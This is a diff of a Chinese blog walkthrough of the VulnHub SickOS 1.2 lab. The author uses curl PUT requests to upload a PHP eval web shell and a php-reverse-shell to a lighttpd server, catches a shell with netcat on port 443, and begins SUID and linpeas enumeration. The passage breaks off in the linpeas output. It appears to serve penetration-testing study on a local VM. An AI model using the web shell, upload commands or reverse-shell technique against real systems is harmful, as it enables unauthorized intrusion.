+<span class="token operator">></span> Accept: */*
+<span class="token operator">></span> 
+* Mark bundle as not supporting multiuse
+<span class="token operator">&lt;</span> HTTP/1.1 201 Created
+<span class="token operator">&lt;</span> Content-Length: 0
+<span class="token operator">&lt;</span> Date: Wed, 19 Apr 2023 17:43:48 GMT
+<span class="token operator">&lt;</span> Server: lighttpd/1.4.28
+<span class="token operator">&lt;</span> 
+* Connection <span class="token comment" spellcheck="true">#0 to host 192.168.56.136 left intact</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>奇了怪了，<code>200</code>，完全没问题啊。</p>
 <p>难道因为Header里的Agent是curl给ban了？</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/SickOS1.2/workSpace]<br>└─$ sudo curl 192.168.56.136/test -T test.html -H <span class="hljs-string">&quot;Expect:&quot;</span> -v -A <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0&quot;</span><br>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current<br>                                 Dload  Upload   Total   Spent    Left  Speed<br>  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 192.168.56.136:80...<br>* Connected to 192.168.56.136 (192.168.56.136) port 80 (<span class="hljs-comment">#0)</span><br>&gt; PUT /test HTTP/1.1<br>&gt; Host: 192.168.56.136<br>&gt; User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0<br>&gt; Accept: */*<br>&gt; Content-Length: 38<br>&gt; <br>&#125; [38 bytes data]<br>* We are completely uploaded and fine<br>* Mark bundle as not supporting multiuse<br>&lt; HTTP/1.1 403 Forbidden<br>&lt; Content-Type: text/html<br>&lt; Content-Length: 345<br>&lt; Date: Wed, 19 Apr 2023 17:46:44 GMT<br>&lt; Server: lighttpd/1.4.28<br>&lt; <br>&#123; [345 bytes data]<br>&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;iso-8859-1&quot;</span>?&gt;<br>&lt;!DOCTYPE html PUBLIC <span class="hljs-string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span><br>         <span class="hljs-string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;<br>&lt;html xmlns=<span class="hljs-string">&quot;http://www.w3.org/1999/xhtml&quot;</span> xml:lang=<span class="hljs-string">&quot;en&quot;</span> lang=<span class="hljs-string">&quot;en&quot;</span>&gt;<br> &lt;<span class="hljs-built_in">head</span>&gt;<br>  &lt;title&gt;403 - Forbidden&lt;/title&gt;<br> &lt;/head&gt;<br> &lt;body&gt;<br>  &lt;h1&gt;403 - Forbidden&lt;/h1&gt;<br> &lt;/body&gt;<br>&lt;/html&gt;<br>100   383  100   345  100    38   136k  15403 --:--:-- --:--:-- --:--:--  187k<br>* Connection <span class="hljs-comment">#0 to host 192.168.56.136 left intact</span><br></code></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulnhub/SickOS1.2/workSpace<span class="token punctuation">]</span>
+└─$ <span class="token function">sudo</span> curl 192.168.56.136/test -T test.html -H <span class="token string">"Expect:"</span> -v -A <span class="token string">"Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"</span>
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 192.168.56.136:80<span class="token punctuation">..</span>.
+* Connected to 192.168.56.136 <span class="token punctuation">(</span>192.168.56.136<span class="token punctuation">)</span> port 80 <span class="token punctuation">(</span><span class="token comment" spellcheck="true">#0)</span>
+<span class="token operator">></span> PUT /test HTTP/1.1
+<span class="token operator">></span> Host: 192.168.56.136
+<span class="token operator">></span> User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>X11<span class="token punctuation">;</span> Linux x86_64<span class="token punctuation">;</span> rv:102.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/102.0
+<span class="token operator">></span> Accept: */*
+<span class="token operator">></span> Content-Length: 38
+<span class="token operator">></span> 
+<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; [38 bytes data]</span>
+* We are completely uploaded and fine
+* Mark bundle as not supporting multiuse
+<span class="token operator">&lt;</span> HTTP/1.1 403 Forbidden
+<span class="token operator">&lt;</span> Content-Type: text/html
+<span class="token operator">&lt;</span> Content-Length: 345
+<span class="token operator">&lt;</span> Date: Wed, 19 Apr 2023 17:46:44 GMT
+<span class="token operator">&lt;</span> Server: lighttpd/1.4.28
+<span class="token operator">&lt;</span> 
+<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123; [345 bytes data]</span>
+<span class="token operator">&lt;</span>?xml version<span class="token operator">=</span><span class="token string">"1.0"</span> encoding<span class="token operator">=</span><span class="token string">"iso-8859-1"</span>?<span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html PUBLIC <span class="token string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span>
+         <span class="token string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>html xmlns<span class="token operator">=</span><span class="token string">"http://www.w3.org/1999/xhtml"</span> xml:lang<span class="token operator">=</span><span class="token string">"en"</span> lang<span class="token operator">=</span><span class="token string">"en"</span><span class="token operator">></span>
+ <span class="token operator">&lt;</span>head<span class="token operator">></span>
+  <span class="token operator">&lt;</span>title<span class="token operator">></span>403 - Forbidden<span class="token operator">&lt;</span>/title<span class="token operator">></span>
+ <span class="token operator">&lt;</span>/head<span class="token operator">></span>
+ <span class="token operator">&lt;</span>body<span class="token operator">></span>
+  <span class="token operator">&lt;</span>h1<span class="token operator">></span>403 - Forbidden<span class="token operator">&lt;</span>/h1<span class="token operator">></span>
+ <span class="token operator">&lt;</span>/body<span class="token operator">></span>
+<span class="token operator">&lt;</span>/html<span class="token operator">></span>
+100   383  100   345  100    38   136k  15403 --:--:-- --:--:-- --:--:--  187k
+* Connection <span class="token comment" spellcheck="true">#0 to host 192.168.56.136 left intact</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>很显然并不是。</p>
 <p>算了。用<code>-X PUT --data</code>传试试行不行。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/SickOS1.2/workSpace]<br>└─$ sudo curl 192.168.56.136/test/test.html -v -X PUT --data <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;put is ok&#x27;) &lt;/script&gt;&quot;</span> <br>*   Trying 192.168.56.136:80...<br>* Connected to 192.168.56.136 (192.168.56.136) port 80 (<span class="hljs-comment">#0)</span><br>&gt; PUT /test/test.html HTTP/1.1<br>&gt; Host: 192.168.56.136<br>&gt; User-Agent: curl/7.87.0<br>&gt; Accept: */*<br>&gt; Content-Length: 36<br>&gt; Content-Type: application/x-www-form-urlencoded<br>&gt; <br>* Mark bundle as not supporting multiuse<br>&lt; HTTP/1.1 201 Created<br>&lt; Content-Length: 0<br>&lt; Date: Wed, 19 Apr 2023 18:03:45 GMT<br>&lt; Server: lighttpd/1.4.28<br>&lt; <br>* Connection <span class="hljs-comment">#0 to host 192.168.56.136 left intact</span><br></code></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulnhub/SickOS1.2/workSpace<span class="token punctuation">]</span>
+└─$ <span class="token function">sudo</span> curl 192.168.56.136/test/test.html -v -X PUT --data <span class="token string">"&lt;script>alert('put is ok') &lt;/script>"</span> 
+*   Trying 192.168.56.136:80<span class="token punctuation">..</span>.
+* Connected to 192.168.56.136 <span class="token punctuation">(</span>192.168.56.136<span class="token punctuation">)</span> port 80 <span class="token punctuation">(</span><span class="token comment" spellcheck="true">#0)</span>
+<span class="token operator">></span> PUT /test/test.html HTTP/1.1
+<span class="token operator">></span> Host: 192.168.56.136
+<span class="token operator">></span> User-Agent: curl/7.87.0
+<span class="token operator">></span> Accept: */*
+<span class="token operator">></span> Content-Length: 36
+<span class="token operator">></span> Content-Type: application/x-www-form-urlencoded
+<span class="token operator">></span> 
+* Mark bundle as not supporting multiuse
+<span class="token operator">&lt;</span> HTTP/1.1 201 Created
+<span class="token operator">&lt;</span> Content-Length: 0
+<span class="token operator">&lt;</span> Date: Wed, 19 Apr 2023 18:03:45 GMT
+<span class="token operator">&lt;</span> Server: lighttpd/1.4.28
+<span class="token operator">&lt;</span> 
+* Connection <span class="token comment" spellcheck="true">#0 to host 192.168.56.136 left intact</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p class='item-img' data-src='/pic/assets/1681996062484-db7c6dab-672e-40ff-b76e-0734b046684f.png'><img src="/pic/assets/1681996062484-db7c6dab-672e-40ff-b76e-0734b046684f.png"></p>
 <p>还真行。那我们把一句话木马传上去用蚁剑连接试试。</p>
 <p><code>&lt;?php @eval($_POST[&quot;shell&quot;]); ?&gt;</code></p>
 <p>传上去一连，轻松连接，非常ok。</p>
 <p>蚁剑的shell用起来怪怪的。</p>
 <p>而且有点不死心，为啥之前的方法传不上去，我们用刚才那种URL写法把php-reverse-shell传上去。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/SickOS1.2/workSpace]<br>└─$ sudo curl 192.168.56.136/test/shell.php -T shell.php -H <span class="hljs-string">&quot;Expect:&quot;</span> -v                                                         <br>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current<br>                                 Dload  Upload   Total   Spent    Left  Speed<br>  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 192.168.56.136:80...<br>* Connected to 192.168.56.136 (192.168.56.136) port 80 (<span class="hljs-comment">#0)</span><br>&gt; PUT /test/shell.php HTTP/1.1<br>&gt; Host: 192.168.56.136<br>&gt; User-Agent: curl/7.87.0<br>&gt; Accept: */*<br>&gt; Content-Length: 5496<br>&gt; <br>&#125; [5496 bytes data]<br>* We are completely uploaded and fine<br>* Mark bundle as not supporting multiuse<br>&lt; HTTP/1.1 201 Created<br>&lt; Content-Length: 0<br>&lt; Date: Wed, 19 Apr 2023 18:09:51 GMT<br>&lt; Server: lighttpd/1.4.28<br>&lt; <br>100  5496    0     0  100  5496      0  1888k --:--:-- --:--:-- --:--:-- 2683k<br>* Connection <span class="hljs-comment">#0 to host 192.168.56.136 left intact</span><br></code></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulnhub/SickOS1.2/workSpace<span class="token punctuation">]</span>
+└─$ <span class="token function">sudo</span> curl 192.168.56.136/test/shell.php -T shell.php -H <span class="token string">"Expect:"</span> -v                                                         
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 192.168.56.136:80<span class="token punctuation">..</span>.
+* Connected to 192.168.56.136 <span class="token punctuation">(</span>192.168.56.136<span class="token punctuation">)</span> port 80 <span class="token punctuation">(</span><span class="token comment" spellcheck="true">#0)</span>
+<span class="token operator">></span> PUT /test/shell.php HTTP/1.1
+<span class="token operator">></span> Host: 192.168.56.136
+<span class="token operator">></span> User-Agent: curl/7.87.0
+<span class="token operator">></span> Accept: */*
+<span class="token operator">></span> Content-Length: 5496
+<span class="token operator">></span> 
+<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; [5496 bytes data]</span>
+* We are completely uploaded and fine
+* Mark bundle as not supporting multiuse
+<span class="token operator">&lt;</span> HTTP/1.1 201 Created
+<span class="token operator">&lt;</span> Content-Length: 0
+<span class="token operator">&lt;</span> Date: Wed, 19 Apr 2023 18:09:51 GMT
+<span class="token operator">&lt;</span> Server: lighttpd/1.4.28
+<span class="token operator">&lt;</span> 
+100  5496    0     0  100  5496      0  1888k --:--:-- --:--:-- --:--:-- 2683k
+* Connection <span class="token comment" spellcheck="true">#0 to host 192.168.56.136 left intact</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>可以发现竟然成功传上去了。</p>
 <p>我们传的php-reverse-shell用的4444端口，始终收不到反弹shell。</p>
 <p class='item-img' data-src='/pic/assets/1681996062559-b498792d-6850-4f12-8961-7330330e847a.png'><img src="/pic/assets/1681996062559-b498792d-6850-4f12-8961-7330330e847a.png"></p>
 <p>换个443试试.</p>
 <p>这次上传定位到上传失败问题：<code>192.168.56.136/test/</code>才能传上去，<code>192.168.56.136/test</code>会失败。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/SickOS1.2/workSpace]<br>└─$ sudo curl 192.168.56.136/test/ -T door.php -H <span class="hljs-string">&quot;Expect:&quot;</span> -v <br>*   Trying 192.168.56.136:80...<br>* Connected to 192.168.56.136 (192.168.56.136) port 80 (<span class="hljs-comment">#0)</span><br>&gt; PUT /test/door.php HTTP/1.1<br>&gt; Host: 192.168.56.136<br>&gt; User-Agent: curl/7.87.0<br>&gt; Accept: */*<br>&gt; Content-Length: 31<br>&gt; <br>* We are completely uploaded and fine<br>* Mark bundle as not supporting multiuse<br>&lt; HTTP/1.1 201 Created<br>&lt; Content-Length: 0<br>&lt; Date: Wed, 19 Apr 2023 18:23:03 GMT<br>&lt; Server: lighttpd/1.4.28<br>&lt; <br>* Connection <span class="hljs-comment">#0 to host 192.168.56.136 left intact</span><br></code></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulnhub/SickOS1.2/workSpace<span class="token punctuation">]</span>
+└─$ <span class="token function">sudo</span> curl 192.168.56.136/test/ -T door.php -H <span class="token string">"Expect:"</span> -v 
+*   Trying 192.168.56.136:80<span class="token punctuation">..</span>.
+* Connected to 192.168.56.136 <span class="token punctuation">(</span>192.168.56.136<span class="token punctuation">)</span> port 80 <span class="token punctuation">(</span><span class="token comment" spellcheck="true">#0)</span>
+<span class="token operator">></span> PUT /test/door.php HTTP/1.1
+<span class="token operator">></span> Host: 192.168.56.136
+<span class="token operator">></span> User-Agent: curl/7.87.0
+<span class="token operator">></span> Accept: */*
+<span class="token operator">></span> Content-Length: 31
+<span class="token operator">></span> 
+* We are completely uploaded and fine
+* Mark bundle as not supporting multiuse
+<span class="token operator">&lt;</span> HTTP/1.1 201 Created
+<span class="token operator">&lt;</span> Content-Length: 0
+<span class="token operator">&lt;</span> Date: Wed, 19 Apr 2023 18:23:03 GMT
+<span class="token operator">&lt;</span> Server: lighttpd/1.4.28
+<span class="token operator">&lt;</span> 
+* Connection <span class="token comment" spellcheck="true">#0 to host 192.168.56.136 left intact</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p class='item-img' data-src='/pic/assets/1681996062488-db4ff877-3206-4f09-9495-6279605c833d.png'><img src="/pic/assets/1681996062488-db4ff877-3206-4f09-9495-6279605c833d.png"></p>
 <p>轻松连接。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nc -lvp 443 <br>listening on [any] 443 ...<br>192.168.56.136: inverse host lookup failed: Host name lookup failure<br>connect to [192.168.56.132] from (UNKNOWN) [192.168.56.136] 51687<br>Linux ubuntu 3.11.0-15-generic <span class="hljs-comment">#25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux</span><br> 11:40:47 up  3:13,  0 <span class="hljs-built_in">users</span>,  load average: 0.00, 0.02, 0.05<br>USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>/bin/sh: 0: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$</span><br></code></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
+└─$ <span class="token function">sudo</span> nc -lvp 443 
+listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> 443 <span class="token punctuation">..</span>.
+192.168.56.136: inverse host lookup failed: Host name lookup failure
+connect to <span class="token punctuation">[</span>192.168.56.132<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span>192.168.56.136<span class="token punctuation">]</span> 51687
+Linux ubuntu 3.11.0-15-generic <span class="token comment" spellcheck="true">#25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux</span>
+ 11:40:47 up  3:13,  0 users,  load average: 0.00, 0.02, 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+uid<span class="token operator">=</span>33<span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> gid<span class="token operator">=</span>33<span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> groups<span class="token operator">=</span>33<span class="token punctuation">(</span>www-data<span class="token punctuation">)</span>
+/bin/sh: 0: can't access <span class="token function">tty</span><span class="token punctuation">;</span> job control turned off
+$
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h2 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h2><ol>
 <li><code>sudo -l need password</code> 需要密码。寄。 </li>
-<li>看看带SUID的程序 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@ubuntu:/$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>667707  268 -rwsr-xr--   1 root     dip        273272 Feb  4  2011 /usr/sbin/pppd<br>667843   20 -rwsr-sr-x   1 libuuid  libuuid     17976 Mar 29  2012 /usr/sbin/uuidd<br>786948    8 -rwsr-xr-x   1 root     root         5564 Dec 13  2011 /usr/lib/eject/dmcrypt-get-device<br>1055122  244 -rwsr-xr-x   1 root     root       248056 Jan 13  2016 /usr/lib/openssh/ssh-keysign<br>668412   12 -rwsr-xr-x   1 root     root         9728 Feb 16  2016 /usr/lib/pt_chown<br>668120   12 -r-sr-xr-x   1 root     root         9532 Mar 30  2016 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper<br>668337   16 -r-sr-xr-x   1 root     root        14320 Mar 30  2016 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper<br>1182917  312 -rwsr-xr--   1 root     messagebus   316824 Jun 13  2013 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>660925   72 -rwsr-xr-x   2 root     root        69708 Feb 27  2013 /usr/bin/sudoedit<br>667308   16 -rwsr-xr-x   1 root     root        14012 Nov  8  2011 /usr/bin/traceroute6.iputils<br>660925   72 -rwsr-xr-x   2 root     root        69708 Feb 27  2013 /usr/bin/sudo<br>659044   32 -rwsr-xr-x   1 root     root        31748 Sep 12  2012 /usr/bin/chsh<br>659043   44 -rwsr-xr-x   1 root     root        41284 Sep 12  2012 /usr/bin/passwd<br>659041   40 -rwsr-xr-x   1 root     root        40292 Sep 12  2012 /usr/bin/chfn<br>667072   44 -rwsr-sr-x   1 daemon   daemon      42800 Oct 25  2011 /usr/bin/at<br>667649   56 -rwsr-xr-x   1 root     root        56208 Jul 28  2011 /usr/bin/mtr<br>659047   60 -rwsr-xr-x   1 root     root        57956 Sep 12  2012 /usr/bin/gpasswd<br>658916   32 -rwsr-xr-x   1 root     root        30896 Sep 12  2012 /usr/bin/newgrp<br>1179695   88 -rwsr-xr-x   1 root     root        88760 Mar 29  2012 /bin/mount<br>1179715   40 -rwsr-xr-x   1 root     root        39116 Nov  8  2011 /bin/ping6                          <br>1182983   28 -rwsr-xr-x   1 root     root        26252 Mar  2  2012 /bin/fusermount<br>1179696   68 -rwsr-xr-x   1 root     root        67720 Mar 29  2012 /bin/umount<br>1179714   36 -rwsr-xr-x   1 root     root        34740 Nov  8  2011 /bin/ping<br>1179689   32 -rwsr-xr-x   1 root     root        31116 Sep 12  2012 /bin/su<br></code></pre></td></tr></table></figure></li>
+<li>看看带SUID的程序</li>
 </ol>
+<pre class="line-numbers language-bash"><code class="language-bash">www-data@ubuntu:/$ <span class="token function">find</span> / -type f -perm -04000 -ls 2<span class="token operator">></span>/dev/null
+<span class="token function">find</span> / -type f -perm -04000 -ls 2<span class="token operator">></span>/dev/null
+667707  268 -rwsr-xr--   1 root     dip        273272 Feb  4  2011 /usr/sbin/pppd
+667843   20 -rwsr-sr-x   1 libuuid  libuuid     17976 Mar 29  2012 /usr/sbin/uuidd
+786948    8 -rwsr-xr-x   1 root     root         5564 Dec 13  2011 /usr/lib/eject/dmcrypt-get-device
+1055122  244 -rwsr-xr-x   1 root     root       248056 Jan 13  2016 /usr/lib/openssh/ssh-keysign
+668412   12 -rwsr-xr-x   1 root     root         9728 Feb 16  2016 /usr/lib/pt_chown
+668120   12 -r-sr-xr-x   1 root     root         9532 Mar 30  2016 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+668337   16 -r-sr-xr-x   1 root     root        14320 Mar 30  2016 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+1182917  312 -rwsr-xr--   1 root     messagebus   316824 Jun 13  2013 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+660925   72 -rwsr-xr-x   2 root     root        69708 Feb 27  2013 /usr/bin/sudoedit
+667308   16 -rwsr-xr-x   1 root     root        14012 Nov  8  2011 /usr/bin/traceroute6.iputils
+660925   72 -rwsr-xr-x   2 root     root        69708 Feb 27  2013 /usr/bin/sudo
+659044   32 -rwsr-xr-x   1 root     root        31748 Sep 12  2012 /usr/bin/chsh
+659043   44 -rwsr-xr-x   1 root     root        41284 Sep 12  2012 /usr/bin/passwd
+659041   40 -rwsr-xr-x   1 root     root        40292 Sep 12  2012 /usr/bin/chfn
+667072   44 -rwsr-sr-x   1 daemon   daemon      42800 Oct 25  2011 /usr/bin/at
+667649   56 -rwsr-xr-x   1 root     root        56208 Jul 28  2011 /usr/bin/mtr
+659047   60 -rwsr-xr-x   1 root     root        57956 Sep 12  2012 /usr/bin/gpasswd
+658916   32 -rwsr-xr-x   1 root     root        30896 Sep 12  2012 /usr/bin/newgrp
+1179695   88 -rwsr-xr-x   1 root     root        88760 Mar 29  2012 /bin/mount
+1179715   40 -rwsr-xr-x   1 root     root        39116 Nov  8  2011 /bin/ping6                          
+1182983   28 -rwsr-xr-x   1 root     root        26252 Mar  2  2012 /bin/fusermount
+1179696   68 -rwsr-xr-x   1 root     root        67720 Mar 29  2012 /bin/umount
+1179714   36 -rwsr-xr-x   1 root     root        34740 Nov  8  2011 /bin/ping
+1179689   32 -rwsr-xr-x   1 root     root        31116 Sep 12  2012 /bin/su
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><code>at</code>没权限，mtr读文件还是成功不了。无果。 </p>
 <ol start="3">
 <li>看看crontab。<br>常规crontab表，一眼没啥可用的东西。 </li>
-<li>传linpeas吧。运行一下，记录一下看起来有点说法的东西 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs bash">══╣ Some home ssh config file was found<br>/usr/share/doc/openssh-client/examples/sshd_config                                                      